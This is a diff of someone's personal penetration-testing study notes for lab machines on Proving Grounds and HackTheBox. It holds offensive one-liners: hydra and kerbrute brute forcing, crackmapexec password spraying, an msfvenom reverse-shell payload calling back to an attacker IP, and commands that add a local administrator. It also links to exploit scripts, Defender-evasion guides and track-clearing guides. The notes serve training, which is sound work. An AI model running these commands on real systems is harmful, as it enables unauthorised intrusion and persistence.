@@ -1,6 +1,57 @@
 *************************[port maps]*************************
 
+(ospg:shenzi) as i learned from shenzi box that there could be specific directories, i should always brute force and hunt for the box specifics and this means they are not using things in the wordlists and these are ways to dig them out:
 
+(htb:friendzone) to find a subdomains that are specific
+vhost specefics
+dig axfr @10.10.10.123 friendzone.red
+
+(ospg) to find smtp users
+(ospg) to find default ftp users
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.168.52 ftp
+--------------------------------------------------
+(ospg:depreciated) good for graphql commands 
+------------------------------------------------
+(ospg:Roquefort) nice way to execute commands using git hooks
+-------------------------------------------------
+https://github.com/0xyy66/CVE-2023-45878_to_RCE/blob/main/CVE-2023-45878.sh
+good script to automate lfi once you know it
+(httb:thefrizz)
+--------------------------------------
+good lfi discovery techniques
+https://medium.com/@bdemir/a-pentesters-guide-to-file-inclusion-8fdfc30275da
+https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb
+nice log poisoning https://medium.com/@mjohn-sec/elevating-local-file-inclusions-to-remote-code-execution-32dc629dab74
+indork: site:medium.com "/.php?page="
+(ospg:injecto)
+----------------------------------------------
+like what you learn in kerbeos brute forcing with big name list and smtp brute force with default  users xato ftp and ssh should be bruteforce for default woth hydra -c and default userpass
+(ospg:)
+---------------------------------------------------------------------------
+(ospg:source) amazing box to bruteforce login with limit using burpsuite
+https://www.exploit-db.com/docs/50436
+------------------------------------------------
+not like ippsec said django can has lfi (ospg:bottleup)
+----------------------------------------------------
+(ospg:heist) if you have ldap access search for these 
+msDS-GroupManagedServiceAccount
+-----------------------------------------------------
+(ospg:heist) interesting go by to try in lfi 
+https://medium.com/@7HPL/analysis-hack-the-box-3d9fcb0c617e
+type C:\inetpub\logs\logfiles\W3SVC2\u_ncsa2.log
+----------------------------------------------------
+(ospg:heist) [*] SSRF to stealing password - ssrf can enable you to steal thje netntlmv2 hash 
+----------------------------------------------------
+for java exploits 
+msfvenom -p java/shell_reverse_tcp lhost=10.10.16.7  lport=443  -f war -o pwn.war
+-------------------------------------------
+(htb:arctic) script to send a form request with the payload
+https://www.exploit-db.com/exploits/50057
+--------------------------------------------
+(ospg:medjet) another nice sql write file 
+https://medium.com/@bdsalazar/proving-grounds-medjed-intermediate-windows-box-writeup-a-journey-to-offensive-security-74a2b7a94a88
+--------------------------------------------
+in connecting the ports look if the box has remote connection protocols like 5895 or 3389 rdp if no means the box is exploit to get into the system then if the box is giving you a lot of paths means might be lfi to read config files
 ------------------------------------------
 (ospg:slort) when the lfi using http did not work i used the smb with & instead of ? and it worked
 -------------------------------------------
@@ -85,6 +136,7 @@ windows local huh !
 
 (htb:Monteverde) crackmapexec smb 10.10.10.172 -u validusers.txt -p validusers.txt --continue-on-success
 
+discover directories with the wordlists big.txt medium and dirsearch
 
 For my bad enum always use -f with gobuster to discover api endpoints
 
@@ -143,7 +195,7 @@ it teach you if you can not find users you use users wordlist to find default ma
 /usr/share/wordlists/seclists/Usernames/Names/names.txt
 
 (ospg:hokkaido) i did the same mistake i need to search for default users same as smtp but for port 88
-
+kerbrute userenum -d hokkaido-aerospace.  --dc 192.168.184.165   /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o kerb.users
 
 ----------------------------------------------------------
 SQLMAP deleting cache
@@ -195,13 +247,20 @@ nmap --script "default or safe or vuln or exploit or fuzzer or version or discov
 filtering enum4linux or rpcclient domusersenum
 cat users.txt | awk -F\\[ '{print $2}' | awk -F\\] '{print $1}' > final_user.txt
 -----------------------------------------------
-
+()
 
 
 *************************[workstation specifics]*************************
 [there are things you can do in this workstaions with this user that you can not do on the other workstations which will get you a domaion user]
 
-
+(ospg:chatty) command to find uncommon s perm 
+find / -perm -u=s 2>/dev/null | grep -v '/proc\|/run\|/sys\|/snap' 
+------------------------------
+(ospg:chatty) i learned something very important from chatty box which is to use linpeas.sh directly once you enter a box to avoid my actions to overwrite some files that potentially contains creds like happended to me 
+----------------------------------------------
+(ospg:educated) good for .apk analysis
+--------------------------------------------------------------------
+windows/remote/36025.py nice msfvenom one liner for a bit advanced binary exploitation (htb:buff) and (htb:)
 -------------------------------------------------------------------
 interesting go by clear you track kali: https://hackingpassion.com/clear-your-tracks-on-linux/
 
@@ -246,6 +305,8 @@ Red team workstation specifics
 https://github.com/A-poc/RedTeam-Tools?tab=readme-ov-file#stop-windows-defender-deleting-mimikatzexe
 ---------------------------------------------------------------------
 some windows commands list for post exploitation https://int0x33.medium.com/day-26-the-complete-list-of-windows-post-exploitation-commands-no-powershell-999b5433b61e
+
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
 ------------------------------------------------------------------------
 (htb:buff) from 0xdf this version binary of windows a that works in hack the box windows_amd64
 and this path runs binary with bypassing windows defender \programdata
@@ -331,6 +392,8 @@ gp4.exe -cmd "cmd /c net start TermService"
 
 xfreerdp /u:mamathere /p:'P@ssword123' /v:192.168.210.66
 
+cmd /c net user mamathere P@ssword123 /add
+cmd /c net localgroup administrators /add mamathere
 -------------------------------------------------------------------
 in the linpeas result the suid/files with interesting perms and you do not have sudo 
 does not  mean you can not exploit them becuase they might have cve (ospg:election1) also because of pwnkit does not mean all the kernel exps are cheating it might be a real workstation specifics
@@ -401,7 +464,18 @@ https://medium.com/@hughbrown123/walk-through-hints-querier-htb-0726d5b18961
 
 *************************[group specifics]*************************
 (ospg:hutch) LAPS enables you to get the domain admin password using ldap if enabled
-
+---------------------------------------------------------------------------------------
+(htb:escapetwo) 
+interesting go by for group specifics
+https://medium.com/@jacobdiamond/how-to-leverage-aces-for-privilege-escalation-and-lateral-movement-5246fd40ca15
+indork: site:medium.com "writeowner" genericall
+------------------------------------------------------------------------------------
+amazing certipy resource 
+https://exploit-notes.hdks.org/exploit/windows/active-directory/shadow-credentials/#exploit?ref=0liverFlow
+from 
+https://arz101.medium.com/hackthebox-mist-c23cdea69ca5
+what pywhisker do
+https://olivierkonate.medium.com/hackthebox-certified-885faf108597
 
 
 
@@ -420,9 +494,11 @@ https://0xdf.gitlab.io/2024/08/10/htb-usage.html
 [*] lfi - enabels you to read config files of programs aftter you  dive the internet for paths (ospg:fish)
 [*] lfi - log poisoning to RCE
 
+[*] insecure deserialization - enable you to RCE
 [+] traversal
 [*] you have a path traversal and a public service you should know where the conf files to get its passwords (ospg:clue)
 
+[*] SeShutdownPrivilege with vulnerable insecure service executable - code execution https://www.exploit-db.com/exploits/48789
 
 ftp
 [*] found local users can be tested with the same user
